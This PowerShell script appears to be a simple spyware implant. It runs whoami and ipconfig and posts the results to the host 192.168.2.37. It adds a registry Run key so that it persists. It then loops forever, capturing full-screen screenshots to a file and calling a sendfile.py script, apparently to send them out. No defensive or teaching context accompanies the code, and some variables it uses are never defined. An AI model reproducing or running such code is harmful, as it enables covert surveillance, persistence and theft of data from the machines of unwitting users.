$var = whoami

$var += ipconfig

$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -header $Header -body $var -UseBasicParsing

# attempt to me perssistant...

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "ss.ps1" `
    -Value "$d -autostart"

# start loop

while ($True)
{
	$File = 'img.png'
	Add-Type -AssemblyName System.Windows.Forms
	Add-type -AssemblyName System.Drawing
	$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
	$Width = $Screen.Width
	$Height = $Screen.Height
	$Left = $Screen.Left
	$Top = $Screen.Top
	$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
	$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
	$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
	$bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png) 


	
	python ./sendfile.py
}
